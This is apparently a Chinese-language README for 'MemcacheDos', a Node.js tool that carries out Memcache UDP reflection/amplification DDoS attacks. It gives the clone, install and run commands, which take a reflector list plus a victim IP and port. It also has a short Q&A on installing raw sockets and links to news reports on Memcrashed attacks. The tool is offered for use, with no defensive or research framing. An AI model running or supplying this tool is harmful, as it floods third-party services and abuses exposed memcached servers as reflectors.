# MemcacheDos
Memcache 反射攻击.

# 如何使用
```
git clone https://github.com/Srar/MemcacheDos.git
cd MemcacheDos
npm install
./node_modules/.bin/ts-node main.ts --list result.txt --ip 1.1.1.1 --port 80
```

# Q&A
* 测试平台
  > CentOS7, nodejs v6.12.3 yum安装
* `npm install`安装`raw-socket`时出现错误
  > 使用`npm install --unsafe` 

# 相关新闻
* [Memcrashed - Major amplification attacks from UDP port 11211](https://blog.cloudflare.com/memcrashed-major-amplification-attacks-from-port-11211/)
* [利用 Memcache 作为 DRDoS 反射放大器进行 DDoS 攻击](https://cert.360.cn/warning/detail?id=c63eb87058834e37c7c112c35ef5f9fd)